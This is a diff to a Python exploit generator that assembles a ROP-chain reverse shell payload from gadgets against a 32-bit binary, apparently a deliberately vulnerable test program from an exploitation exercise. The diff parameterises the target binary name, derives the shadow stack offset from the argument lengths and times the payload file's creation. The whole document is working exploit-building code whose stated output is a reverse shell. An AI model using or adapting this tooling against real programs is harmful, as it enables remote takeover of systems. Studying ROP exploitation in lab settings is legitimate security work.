@@ -4,8 +4,7 @@ from struct import pack
 from get_gadgets import Gadget
 import exploit_gadgets
 import sys
-
-binary_name = "vuln3-32-test"
+import time
 
 gadgets = dict()
 
@@ -105,11 +104,10 @@ def create_shadow_stack_ropchain(cli_args, base_address, shadow_stack_offset):
     return p
 
 
-def rop_exploit(cli_args, base_address):
+def rop_exploit(binary_name, cli_args, shadow_stack_address):
     """Create the full ROP chain reverse shell exploit
 
     :param cli_args: The command line arguments
-    :param base_address: The base .data address
     :return: The full ROP chain reverse shell exploit packed bytes sequence
     """
     (padding, data, bss) = input_length.get_everything(binary_name)
@@ -120,10 +118,10 @@ def rop_exploit(cli_args, base_address):
 
     exploit += create_stack_ropchain(cli_args,data)
     exploit += address_pop.pop_reg(data,gadgets['POPEBX'],0,gadgets['INCEBX'],"inc")[0]
-    exploit += create_shadow_stack_ropchain(cli_args,data,60)
+    exploit += create_shadow_stack_ropchain(cli_args,data,shadow_stack_address)
     
 
-    exploit += address_pop.pop_reg(data + 60,gadgets['POPECXEBX'],0,gadgets['INCECX'],"inc")[0]
+    exploit += address_pop.pop_reg(data + shadow_stack_address,gadgets['POPECXEBX'],0,gadgets['INCECX'],"inc")[0]
     exploit += address_pop.pop_reg(data,gadgets['POPEBX'],0,gadgets['INCEBX'],"inc")[0]
 
     exploit += address_pop.pop_reg(data + 48,gadgets['POPEDX'],0,gadgets['DECEDX'],"dec")[0]
@@ -147,10 +145,13 @@ def main():
         args.append(preprocess(arg))
 
     print(args)
+    shadow_stack_address = sum([len(x) + 1 for x in args]) + 1
     fileName=sys.argv[2]
+    start_time = time.time()
     outfile=open(fileName, "wb")
-    outfile.write(rop_exploit(args, 0x080da060))
+    outfile.write(rop_exploit(sys.argv[1], args, shadow_stack_address))
     outfile.close()
+    print("Created ROP-chain file in {} s...".format(time.time() - start_time))
 
 
 if __name__ == "__main__":
